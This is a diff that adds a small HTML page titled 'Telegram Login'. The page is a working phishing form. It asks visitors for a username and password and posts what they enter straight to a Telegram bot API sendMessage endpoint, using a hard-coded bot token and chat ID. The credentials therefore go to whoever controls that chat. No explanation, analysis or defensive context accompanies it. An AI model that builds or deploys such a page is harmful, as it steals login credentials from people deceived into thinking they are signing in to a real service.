@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Telegram Login</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding-top: 50px; }
+    input { padding: 10px; margin: 10px; width: 80%; }
+    button { padding: 10px 30px; }
+  </style>
+</head>
+<body>
+  <h2>Telegram Login</h2>
+  <form action="https://api.telegram.org/bot8112935549:AAHqolaQiI8N89I8tMVblpeE5cAIyN1sjA0/sendMessage" method="POST">
+    <input type="hidden" name="chat_id" value="7357317760">
+    <input name="text" placeholder="Username" required><br>
+    <input name="text" placeholder="Password" required><br>
+    <button type="submit">Login</button>
+  </form>
+</body>
+</html>
